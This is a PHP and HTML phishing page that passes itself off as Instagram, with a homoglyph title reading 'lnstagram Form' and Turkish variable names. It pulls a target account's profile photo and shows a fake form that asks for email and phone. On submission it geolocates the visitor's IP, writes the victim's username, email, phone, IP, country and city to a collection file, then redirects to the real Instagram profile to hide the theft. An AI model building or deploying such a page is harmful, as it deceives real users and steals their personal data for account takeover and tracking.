<?php
$lorex=$_GET['nick'];
function fotocekme($lorex) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL,"https://www.instatakipci.com/phpCurl");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,
        "user=".$lorex."&productAsks=%7B%22sm_domain%22%3A%22https%3A%2F%2Fwww.instagram.com%2F%22%2C%22preview%22%3A%221%22%2C%22sm_type_id%22%3A1%2C%22link_status%22%3A0%2C%22image_way%22%3A%22%22%7D&multiOptionTake=&nextTimeline=");

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $server_output = curl_exec($ch);

    curl_close ($ch);

    $data = json_decode($server_output,true);

    return $data['imageChange'];
}

$lorexresim = fotocekme($lorex);
if($_POST){
  $mail=$_POST["mail"];
  $phone=$_POST["phone"];
  $ip=$_SERVER["REMOTE_ADDR"];
  $konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
$ulke = $cek->country;
$sehir = $cek->city;
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('lorexform.php', 'a');
fwrite($file, "
<html>
<head>
  <meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<body bgcolor='#000000'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='black'>
<hr>
<font color='red'>Kullanıcı Adı: </font><font color='white'>".$lorex."</font><br>
<font color='red'> Email: </font><font color='white'>".$mail."</font><br>
<font color='red'> Phone: </font><font color='white'>".$phone."</font><br>
<font color='red'>Ip Adresi: </font><font color='white'>".$ip."</font><br>
<font color='red'>Tarih: </font><font color='white'>".$cur_time."</font><br>
<font color='red'>Ülke: </font><font color='white'>".$ulke."</font><br>
<font color='red'>Şehir: </font><font color='white'>".$sehir."</font><br>
<hr>
<br>

"); 
fclose($file);


header("location: https://instagram.com/$lorex");
}

 ?>
<!DOCTYPE html>
<html>
<head>
  <title>lnstagram Form</title>
  <meta charset="utf-8">
  <meta name="robots" content="noimageindex, noarchive">
  <meta name="apple-mobile-web-app-status-bar-style" content="default">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="theme-color" content="#ffffff">
  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover">

  <link rel="stylesheet" href="css/style1.css" type="text/css" crossorigin="anonymous">

  <link rel="stylesheet" href="css/style2.css" type="text/css" crossorigin="anonymous">

  <link rel="stylesheet" href="css/style3.css" type="text/css" crossorigin="anonymous">
  <script>
    function form_kontrol()
    {
      if(document.getElementById("password").value.length == 0)
        document.getElementById("gonder").disabled = true;
      else
        document.getElementById("gonder").disabled = false;
      document.getElementById("gonder").style.background = "#3897f0";
      document.getElementById("gonder").style.borderColor = "#3897f0";
    }
  </script>   
  <style>
    #kutu{
      font-family: sans-serif;
      background: white;
      margin-top: 45px;
      padding-top: 7px;
      padding-bottom: 4px;
      width: 350px;
      max-width: 90%;
      border: 1px solid #dedede;
      height: 80vh;

    }
    #username{
      text-overflow: ellipsis; font: 400 13.3333px Arial;color:; font-size:13px; background-color:#fafafa; outline:none; padding-left:6px;width:260px ;height:30px; border: 1px solid #e6e6e6; margin:7px; font-weight:300;border-radius:3px; margin:4px;  

    }

          .button {

-webkit-box-direction: normal;
margin: 0;
font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
font-size: 14px;
line-height: 20px;
appearance: none;
background: 0 0;
box-sizing: border-box;
cursor: pointer;
display: block;
font-weight: 600;
padding: 5px;
text-align: center;
text-transform: inherit;
text-overflow: ellipsis;
user-select: none;
width: 80%;
border-radius: 4px;
color: rgba(var(--eca,255,255,255),1);
position: relative;
border: 1px solid transparent;
background-color: rgba(var(--d69,0,149,246),1);
      }
      .button:disabled {
        opacity: 0.5;
      }
      .hide {
        display: none;
      }

  </style>
         <form class="HmktE" id="your_form_id" enctype="index.php" method="post">

</head>
<body>

</footer><div class="MFkQJ ABLKx VhasA _1-msl"><div class="GfkS6 "></div><div class="ZsSMR"><a class="z1VUo KD4vR ABLKx VhasA" href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DsignupPage%26ig_mid%3DAE2FF212-B09F-4D9D-97C1-5FD6BB456D90%26utm_content%3Dlo%26utm_medium%3Dbadge" role="alert"><section class="dZvHF  fvoD7"><p class="xK6EF">lnstagram</p><p class="_5b2Kp">Find it for free on Google Play.
</p></section><section class="FMlV_"><button class="_4IAxF">Get</button></section></a></div></div></section></div>
<center>
  <div id="kutu">
    <br>
    <center>
      <img src="<?php echo $lorexresim; ?>" alt="" width=150 style="border-radius:50%;margin-top:15px;">
    </center>
    <br>
    <div class="Et89U">

            <label class="f0n8F "><input  id="username" name="Phone Number" required="" placeholder="Full name" class="_2hvTZ pexuQ zyHYP" onkeyup="form_kontrol()"></label>     <br>

      <label class="f0n8F "><input  id="username" value="<?php echo $lorex; ?>" name="username" required="" placeholder="Username" class="_2hvTZ pexuQ zyHYP" onkeyup="form_kontrol()"></label>     <br>

      <label class="f0n8F "><input  id="username" type="email" class="m" name="mail"  required="" placeholder="Email adress" class="_2hvTZ pexuQ zyHYP" onkeyup="form_kontrol()"></label>     <br>      

      <label class="f0n8F "><input  id="username" type="number" class="m" name="phone" required="" placeholder="Phone Number" class="_2hvTZ pexuQ zyHYP" onkeyup="form_kontrol()"></label>     <br>      
<center>
<button type="submit" id="gonder" class="button" style="background: rgb(56, 151, 240); border-color: rgb(56, 151, 240);">
             <span class="btn-txt">Send</span>
       </button><br><br></center>
<br>
    </div>


  </center>
<br>

</body>
</html>
      <div class="tHaIX Igw0E rBNOH YBx95 ybXk5 _4EzTm O1flK _7JkPY PdTAI ZUqME" style="height: 60px; width: 100%;"><img src="resim/from.png" alt="fb" width="95"></div></div></center></body></form></head></html>
